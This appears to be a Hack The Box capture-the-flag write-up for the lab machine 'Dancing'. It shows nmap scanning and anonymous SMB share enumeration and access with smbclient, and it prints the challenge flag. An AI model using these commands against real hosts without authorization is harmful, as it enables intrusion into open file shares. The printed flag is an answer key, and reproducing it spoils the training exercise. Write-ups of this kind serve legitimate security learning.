# Dancing — Hack The Box Writeup

- **Difficulty:** Very Easy
- **OS:** Windows
- **Category:** Starting Point
- **Date:** May 2026

---

## Summary
Dancing is a Windows machine exposing SMB shares with no 
password, allowing anonymous access to user folders and 
sensitive files.

---

## Recon

### Nmap Scan
nmap -sV -Pn 10.129.219.17

### Results
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  http
Service Info: OS: Windows

---

## Enumeration

Listed SMB shares anonymously:
smbclient -L 10.129.219.17 -N

### Shares Found
- ADMIN$  → needs password
- C$      → needs password
- IPC$    → not useful
- WorkShares → open, no password

---

## Exploitation

Connected to WorkShares anonymously:
smbclient \\10.129.219.17\WorkShares -N

Found two folders:
- Amy.J  → worknotes.txt
- James.P → flag.txt

Downloaded flag with: get flag.txt

---

## Flag
5f61c10dffbc77a704d76016a22f1664

---

## Lessons Learned
- SMB shares should never be open anonymously
- Always enumerate all shares during recon
- User folders can contain sensitive files
